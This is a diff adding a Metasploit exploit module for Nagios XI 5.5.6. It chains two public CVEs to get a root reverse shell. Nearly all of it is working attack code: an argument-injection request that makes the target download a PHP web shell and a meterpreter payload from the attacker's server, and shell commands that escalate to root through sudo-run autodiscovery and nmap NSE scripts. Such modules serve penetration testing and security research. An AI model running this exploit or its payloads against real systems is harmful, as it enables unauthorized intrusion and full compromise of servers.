@@ -1,0 +1,183 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::EXE
+  include Msf::Exploit::FileDropper
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Remote::HttpServer::HTML
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => "Nagios XI Magpie_debug.php Root Remote Code Execution",
+      'Description'    => %q{
+         This module exploits two vulnerabilities in Nagios XI 5.5.6:
+         CVE-2018-15708 which allows for unauthenticated remote code execution
+         and CVE 2018–15710 which allows for local privilege escalation.
+         When combined, these two vulnerabilities give us a root reverse shell.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Chris Lyne (@lynerc)', # First working exploit
+          'Guillaume André (@yaumn_)' # Metasploit module
+        ],
+      'References'     =>
+        [
+          ['CVE', '2018-15708'],
+          ['CVE', '2018-15710'],
+          ['EDB', '46221'],
+          ['URL', 'https://medium.com/tenable-techblog/rooting-nagios-via-outdated-libraries-bb79427172'],
+          ['URL', 'https://www.tenable.com/security/research/tra-2018-37']
+        ],
+      'Platform'       => 'linux',
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Targets'        =>
+        [
+          ['Nagios XI 5.5.6', version: Gem::Version.new('5.5.6')]
+        ],
+      'DefaultOptions' =>
+        {
+          'RPORT' => 443,
+          'SSL' => true
+        },
+      'Privileged'     => false,
+      'DisclosureDate' => "2018-11-14",
+      'DefaultTarget'  => 0
+     ))
+
+    register_options(
+      [
+        OptString.new('RSRVHOST', [true, 'A public IP at which your host can be reached (e.g. your router IP)']),
+        OptString.new('RSRVPORT', [true, 'The port that will forward to the local HTTPS server', 8080]),
+        OptInt.new('HTTPDELAY', [false, 'Number of seconds the web server will wait before termination', 5])
+      ])
+
+    @WRITABLE_PATHS = [
+      ['/usr/local/nagvis/share', '/nagvis'],
+      ['/var/www/html/nagiosql',  '/nagiosql']
+    ]
+    @writable_path_index = 0
+    @MAGPIERSS_PATH = '/nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php'
+    @session_opened = false
+    @webshell_name = "#{Rex::Text.rand_text_alpha(10)}.php"
+    @nse_name = "#{Rex::Text.rand_text_alpha(10)}.nse"
+    @meterpreter_name = Rex::Text.rand_text_alpha(10)
+  end
+
+  def on_request_uri(cli, req)
+    if @current_payload == @webshell_name
+      send_response(cli, '<?php system($_GET[\'cmd\'])?>')
+    else
+      send_response(cli, generate_payload_exe)
+    end
+  end
+
+  def primer
+    res = send_request_cgi(
+      {
+        'method'  => 'GET',
+        'uri'     => normalize_uri(@MAGPIERSS_PATH),
+        'vars_get' => {
+          'url' => "https://#{datastore['RSRVHOST']}:#{datastore['RSRVPORT']}#{get_resource} " +
+          '-o ' + @WRITABLE_PATHS[@writable_path_index][0] + "/#{@current_payload}"
+        }
+      }, 5)
+
+    if !res || res.code != 200
+      print_error('Couldn\'t send malicious request to target.')
+    end
+ end
+
+  def check_upload
+    res = send_request_cgi(
+      {
+        'method' => 'GET',
+        'uri'    => normalize_uri("#{@WRITABLE_PATHS[@writable_path_index][1]}/#{@current_payload}")
+      }, 5)
+    if res && res.code == 200
+      print_status("#{@current_payload} uploaded with success!")
+      return true
+    else
+      print_error("Couldn't upload #{@current_payload}.")
+      return false
+    end
+  end
+
+  def check
+    res = send_request_cgi(
+      {
+        'method'  => 'GET',
+        'uri'     => normalize_uri(@MAGPIERSS_PATH)
+      }, 5)
+
+    if res && res.code == 200
+      return Exploit::CheckCode::Appears
+    else
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+    all_files_uploaded = false
+
+    # Upload useful files on the target
+    for i in 0..@WRITABLE_PATHS.size
+      @writable_path_index = i
+      for filename in [@webshell_name, @meterpreter_name]
+        @current_payload = filename
+        begin
+          Timeout.timeout(datastore['HTTPDELAY']) { super }
+        rescue Timeout::Error
+          if !check_upload
+            break
+          elsif filename == @meterpreter_name
+            all_files_uploaded = true
+          end
+        end
+      end
+      if all_files_uploaded
+        break
+      end
+    end
+
+    meterpreter_path = "#{@WRITABLE_PATHS[@writable_path_index][0]}/#{@meterpreter_name}"
+
+    register_file_for_cleanup(
+      "#{@WRITABLE_PATHS[@writable_path_index][0]}/#{@webshell_name}",
+      meterpreter_path,
+      "/var/tmp/#{@nse_name}"
+    )
+
+    # Commands to escalate privileges, some will work and others won't
+    # depending on the Nagios version
+    cmds = [
+      "chmod +x #{meterpreter_path} && sudo php /usr/local/nagiosxi/html/includes/" \
+      "components/autodiscovery/scripts/autodiscover_new.php --addresses=\'127.0.0.1/1`#{meterpreter_path}`\'",
+      "echo 'os.execute(\"#{meterpreter_path}\")' > /var/tmp/#{@nse_name} " \
+      "&& sudo nmap --script /var/tmp/#{@nse_name}"
+   ]
+
+    # Try to launch root shell
+    for cmd in cmds
+      res = send_request_cgi(
+        {
+          'uri'     => normalize_uri("#{@WRITABLE_PATHS[@writable_path_index][1]}/#{@webshell_name}"),
+          'method'  => 'GET',
+          'vars_get' => {
+            'cmd' => cmd
+          }
+        }, 5)
+
+      if !res && session_created?
+        break
+      end
+      print_status('Couldn\'t get remote root shell, trying another method')
+    end
+  end
+end
